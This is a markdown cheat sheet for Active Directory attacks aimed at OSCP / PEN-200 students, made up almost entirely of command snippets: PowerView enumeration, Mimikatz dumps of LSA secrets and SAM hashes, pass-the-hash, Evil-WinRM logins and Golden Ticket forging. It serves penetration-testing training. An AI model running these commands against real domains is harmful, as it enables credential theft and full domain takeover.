# 🛡️ OSCP Active Directory Cheat Sheet

This is a quick-reference guide for common Active Directory exploitation commands used in the PEN-200 / OSCP course.

---

## 🔍 Enumeration (PowerView)

### Get Domain Information
```powershell
Get-NetDomain
Get-NetDomainController
```

### User Hunting
```powershell
Get-NetUser | select cn
Get-UserProperty -Properties description
Find-LocalAdminAccess
```

### Group & Share Enumeration
```powershell
Get-NetGroup | select name
Get-NetGroupMember "Domain Admins"
Invoke-ShareFinder
```

---

## 🔑 Credential Access (Mimikatz)

### Dump LSA Secrets
```cmd
privilege::debug
lsadump::lsa /patch
```

### Dump Hashes (SAM)
```cmd
lsadump::sam
```

### Pass-the-Hash (PtH)
```cmd
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH
```

---

## 🚀 Lateral Movement & Persistence

### Evil-WinRM
```bash
evil-winrm -i 10.10.10.10 -u user -p password
```

### Golden Ticket (Mimikatz)
```cmd
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500
```

---

## 🛠️ BloodHound (SharpHound)

### Collect All Data
```powershell
Invoke-BloodHound -CollectionMethod All -Domain corp.local
```

---

> [!TIP]
> Always verify the environment before running noisy tools like BloodHound or Mimikatz. Use `whoami /groups` to check your current privileges first.
